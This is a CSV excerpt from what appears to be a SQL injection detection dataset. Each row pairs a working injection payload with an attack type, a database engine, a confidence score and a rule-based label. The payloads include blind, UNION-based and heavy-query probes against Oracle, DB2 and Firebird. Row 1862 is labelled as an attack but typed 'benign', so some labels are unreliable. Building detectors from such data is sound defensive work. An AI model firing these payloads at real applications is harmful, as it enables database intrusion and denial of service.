row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1860,"1"" ) ) as uycc where 4364 = 4364 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,4364 = 4364 and detected — boolean_blind injection (priority 8) on generic,rule-based
1861,"-4145%"" ) ) union all select 9404,9404,9404,9404,9404,9404,9404#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1862,1' ) ) ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1863,"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1864,"1 ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 7484 = 7484",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1865,1' ) as yyyb where 1705 = 1705 and ( 8770 = 6988 ) *6988--,1,,boolean_blind,generic,0.95,1705 = 1705 and detected — boolean_blind injection (priority 8) on generic,rule-based
1866,"1%' ) ) ) union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1867,"1'|| ( select 'zpwe' from dual where 7743 = 7743 union all select null,null#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
1868,-9145' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'yvfl' like 'yvfl,1,,boolean_blind,firebird,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on firebird",rule-based
1869,"1%"" union all select null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1870,"1' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
1871,"1'+ ( select unzl where 3432 = 3432 union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1872,"1'+ ( select 'gqsk' where 3087 = 3087 union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
